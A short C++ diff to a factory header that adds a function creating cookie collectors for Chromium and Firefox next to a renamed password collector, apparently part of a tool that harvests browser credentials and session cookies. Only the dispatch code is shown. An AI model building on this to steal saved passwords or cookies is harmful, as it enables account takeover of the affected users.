@@ -2,6 +2,8 @@
 #include "ICollector.h"
 #include "ChromeParser.h"
 #include "FireFoxParser.h"
+#include "ChromeCookiesParser.h"
+#include "FireFoxCookiesParser.h"
 
 namespace collector
 {
@@ -12,7 +14,7 @@ namespace collector
 		Mozilla = 64,
 	};
 
-	inline ICollector* create_collector(BrowserType type_collector)
+	inline ICollector<AccountData>* create_password_collector(BrowserType type_collector)
 	{
 		switch (type_collector)
 		{
@@ -22,5 +24,18 @@ namespace collector
 			default: return nullptr;;
 		}
 	}
+
+	inline ICollector<CookieData>* create_cookies_collector(BrowserType type_collector)
+	{
+		switch (type_collector)
+		{
+		case BrowserType::None: return nullptr;
+		case BrowserType::Chromium: return new ChromeCookiesParser();
+		case BrowserType::Mozilla: return new FireFoxCookiesParser();
+		default: return nullptr;;
+		}
+	}
+
+
 	
 }
